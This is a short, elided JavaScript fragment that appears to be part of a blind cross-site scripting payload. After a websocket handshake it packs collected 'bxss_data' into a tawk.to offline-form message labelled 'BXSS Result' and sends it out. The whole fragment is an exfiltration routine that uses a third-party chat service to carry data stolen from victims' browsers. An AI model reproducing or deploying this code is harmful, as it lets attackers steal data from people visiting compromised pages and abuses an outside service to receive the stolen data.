  ...
  .then((data) => {
    ...
    ws.onmessage = function (evt) {
      ...
      if (received_msg == '3probe') {
        ws.send('5');
        ws.send('4' + JSON.stringify({"c":"service","cb":0,"p":["visitor-chat","/v1/visitor/offline-form",{"questions":[{"label":"Submitted From","answer":`https://tawk.to/chat/${api_key}/default`},{"label":"Name","answer":"BXSS Result"},{"label":"Email","answer":"test@test.com"},{"label":"Message","answer":JSON.stringify(bxss_data)}],"name":"test","email":"test@test.com"}]}));
      }
    };
  });
});
